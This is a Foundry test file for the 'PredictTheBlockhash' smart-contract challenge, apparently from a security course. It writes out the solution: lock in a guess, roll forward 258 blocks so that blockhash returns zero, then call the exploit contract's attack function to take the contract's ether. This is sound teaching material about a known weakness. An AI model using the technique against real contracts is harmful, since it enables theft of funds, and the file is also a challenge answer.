// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {PredictTheBlockhash, ExploitContract} from "../../src/Week8-9/PredictTheBlockhash.sol";

//forge test --match-contract PredictTheBlockhashTest -vvvv
contract PredictTheBlockhashTest is Test {
    PredictTheBlockhash public predictTheBlockhash;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        predictTheBlockhash = (new PredictTheBlockhash){value: 1 ether}();
        exploitContract = new ExploitContract(predictTheBlockhash);
    }

    function testExploit() public {
        // Set block number
        uint256 blockNumber = block.number;
        // To roll forward, add the number of blocks to blockNumber,
        // Eg. roll forward 10 blocks: blockNumber + 10
        console2.log(blockNumber);
        // Put your solution here
        exploitContract.lockInGuess{value: 1 ether}();
        vm.roll(blockNumber + 258);
        exploitContract.attack();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheBlockhash.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
